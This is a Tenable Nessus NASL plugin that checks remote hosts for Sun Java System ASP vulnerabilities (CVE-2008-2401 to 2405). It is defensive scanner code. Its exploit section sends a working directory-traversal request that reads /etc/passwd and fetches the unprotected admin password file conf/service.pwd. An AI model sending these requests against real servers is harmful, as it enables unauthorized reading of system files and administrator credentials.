#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(33439);
  script_version("$Revision: 1.2 $");

  script_cve_id(
    "CVE-2008-2401", 
    "CVE-2008-2402", 
    "CVE-2008-2403", 
    "CVE-2008-2404", 
    "CVE-2008-2405"
  );
  script_bugtraq_id(29537, 29538, 29540, 29542, 29550);
  script_xref(name:"OSVDB", value:"46015");
  script_xref(name:"OSVDB", value:"46016");
  script_xref(name:"OSVDB", value:"46017");
  script_xref(name:"OSVDB", value:"46018");
  script_xref(name:"OSVDB", value:"46019");
  script_xref(name:"Secunia", value:"30523");

  script_name(english:"Sun Java System ASP < 4.0.3 Multiple Vulnerabilities");
  script_summary(english:"Tries several exploits and a banner check");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by several vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Sun Java System Active Server Pages (ASP),
or an older variant such as Sun ONE ASP or Chili!Soft ASP. 

The web server component of the installed version of Active Server
Pages on the remote host is affected by several vulnerabilities :

  - A flaw in an include file used by several of the
    administration server's ASP applications allows an
    attacker to write arbitrary data to a file specified
    by an attacker on the affected host. This issue does
    not affect ASP Server on a Windows platform 
    (CVE-2008-2401).

  - Password and configuration data are stored in the 
    administration server's web root and can be retrieved
    without credentials. This issue does not affect ASP 
    Server on a Windows platform (CVE-2008-2402).

  - Multiple directory traversal vulnerabilities exist in
    several of the administration server's ASP 
    applications can be abused to read or even delete
    arbitrary files on the affected host. This issue does
    not affect ASP Server on a Windows platform 
    (CVE-2008-2403).

  - A stack buffer overflow allows code execution in the 
    context of the ASP server (by default root) and can be
    exploited without authentication (CVE-2008-2404).

  - Several of the administration server's ASP applications
    fail to filter or escape user input before using it to
    generate commands before executing them in a shell.
    While access to these applications nominally requires
    authentication, there are reportedly several methods
    of bypassing authentication (CVE-2008-2405)." );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=705" );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=706" );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=707" );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=708" );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=709" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-06/0029.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-06/0030.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-06/0032.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-06/0034.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-06/0036.html" );
 script_set_attribute(attribute:"see_also", value:"http://sunsolve.sun.com/search/document.do?assetkey=1-66-238184-1" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Sun Java System ASP version 4.0.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 5100);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:5100);
if (!get_port_state(port)) exit(0);


# Get the Server response header.
server = "";
banner = get_http_banner(port:port);
if (banner)
{
  server = strstr(banner, "Server:");
  if (server) server = server - strstr(server, string("\n"));
}


# Unless we're paranoid, make sure the banner looks like Sun/Chili!Soft ASP.
if (report_paranoia < 2)
{
  if (
    !server ||
    (
      "Sun-ONE-ASP/" >!< server &&
      "Chili!Soft-ASP/" >!< server
    )
  ) exit(0);
}


# If we're looking at the admin server...
os = get_kb_item("Host/OS/smb");

res = http_get_cache(item:"/", port:port);
if (res == NULL) exit(0);

if (';URL=/caspadmin/index.asp"' >< res && (!os || "Windows" >!< os))
{
  vulns = 0;

  # Try to exploit the directory traversal issue to read a file.
  file = "/etc/passwd";
  url = "/caspsamp/shared/viewsource.asp?source=/caspsamp/../../../../../../../../../../../.."+file;

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    vulns++;

    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to retrieve the contents of '", file, "'\n",
        "using the URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        if ("start source code -->" >< res)
        {
          contents = strstr(res, "start source code -->") - "start source code -->";
          if ("<!-- end source" >< contents) contents = contents - strstr(contents, "<!-- end source");
          contents = str_replace(find:"&nbsp;", replace:" ", string:contents);
          contents = str_replace(find:"<br>", replace:"", string:contents);
        }
        if (
          !contents || 
          !egrep(pattern:"root:.*:0:[01]:", string:contents)
        ) contents = res;

        report = string(
          report,
          "\n",
          "The response was :\n",
          "\n",
          contents
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    if (!thorough_tests) exit(0);
  }

  # Try to exploit the info disclosure issue to read a file.
  file = "conf/service.pwd";
  url = "/"+file;

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  if (egrep(pattern:"^admin:[^.]{13}$", string:res))
  {
    vulns++;

    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to retrieve the contents of '", file, "'\n",
        "using the URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "The response was :\n",
          "\n",
          res
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    if (vulns) exit(0);
  }
}


# Check the version in the Server response header.
#
# nb: Sun's advisory doesn't mention anything about Chili!Soft.
if (server && server =~ "Sun-ONE-ASP/4\.0\.[0-2]($|[^0-9])")
{
  if (report_verbosity)
  {
    ver = strstr(server, "Sun-ONE-ASP/") - "Sun-ONE-ASP/";
    if (" " >< ver) ver = ver - strstr(ver, " ");

    report = string(
      "\n",
      "Sun Java ASP Server version ", ver, " appears to be running on the remote\n",
      "host based on the following Server response header :\n",
      "\n",
      "  ", server, "\n"
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
